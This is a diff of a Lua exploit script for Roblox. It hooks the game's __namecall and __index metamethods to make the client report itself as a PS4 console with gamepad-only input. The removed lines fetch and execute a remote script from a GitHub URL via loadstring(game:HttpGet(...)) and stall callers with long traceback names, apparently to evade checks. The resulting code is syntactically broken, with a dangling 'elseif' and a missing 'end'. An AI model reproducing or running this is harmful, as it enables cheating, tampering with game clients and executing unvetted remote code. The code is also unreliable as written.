@@ -13,71 +13,49 @@ if not queueteleport then
         end
 
         queueteleport([=[
-            local LOBBY_PLACE = 10179538382
-            local PC_PLACE = 13643807539
-
             game:GetService("ScriptContext"):SetTimeout(1)
+            local UserInputService = game:GetService("UserInputService")
+            local GuiService = game:GetService("GuiService")
+            local Platform = Enum.Platform.PS4
 
-            local function cref(inst)
-                if cloneref then
-                    return cloneref(inst)
-                end
-                return inst
-            end
+            local oldNamecall, oldIndex;
 
-            local function protect(fn)
-                if newcclosure then
-                    return newcclosure(fn)
-                end
-                return fn
-            end
+            oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+            if checkcaller() then
+                return oldNamecall(self, ...)
+             end
+    local method = getnamecallmethod()
+    if self == UserInputService or self == GuiService then
+        if method == "GetPlatform" then
+            return Platform
+        elseif method == "IsTenFootInterface" then
+            return true
+        elseif method == "GetPlatformName" then
+            return "PS4"
+        end
+    end
+    return oldNamecall(self, ...)
+end))
 
-            if game.PlaceId == LOBBY_PLACE then
-                local GuiService = cref(game:GetService("GuiService"))
-                local UserInputService = cref(game:GetService("UserInputService"))
+oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, index)
+    if checkcaller() then
+        return oldIndex(self, index)
+    end
+    if self == UserInputService and tostring(getcallingscript()) ~= "ControlModule" then
+        if index == "TouchEnabled"
+        or index == "MouseEnabled"
+        or index == "KeyboardEnabled" then
+            return false
+        elseif index == "GamepadEnabled"
+        or index == "ControllerEnabled" then
+            return true
+        end
+    end
+    return oldIndex(self, index)
+end))
 
-                local oldNamecall
-                oldNamecall = hookmetamethod(game, "__namecall", protect(function(self, ...)
-                    local method = getnamecallmethod()
-
-                    local ok, traceback = pcall(debug.traceback)
-                    if ok and traceback and traceback:match("PlayerGui") then
-                        local lp = game:GetService("Players").LocalPlayer
-                        if lp then
-                            local sourceName = traceback:gsub(string.format("Players.%s.PlayerGui.", lp.Name), "")
-                            if sourceName:len() > 32 then
-                                return task.wait(9e9)
-                            end
-                        end
-                    end
-
-                    if method == "IsTenFootInterface" then
-                        return true
-                    end
-
-                    return oldNamecall(self, ...)
-                end))
-
-                local oldIndex
-                oldIndex = hookmetamethod(game, "__index", protect(function(self, key)
-                    if key == "IsTenFootInterface" then
-                        return function()
-                            return true
-                        end
-
-                    return oldIndex(self, key)
-                end))
-
-                pcall(function()
-                    hookfunction(GuiService.IsTenFootInterface, protect(function()
-                        return true
-                    end))
-                end)
-
-                pcall(function()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/d4e6f8a0b2c4d6e8f0a2c4e6f8a0b2c4d6/cloudflare-global/refs/heads/main/gilaigla.lua"))()
-                end)
-            elseif game.PlaceId == PC_PLACE then
+loadstring(game:HttpGet(""))()
+elseif game.PlaceId == 13643807539 then
                 repeat task.wait() until not game.ReplicatedFirst:FindFirstChild("Intro")
                 game:GetService("ScriptContext"):SetTimeout(9e9)
             end
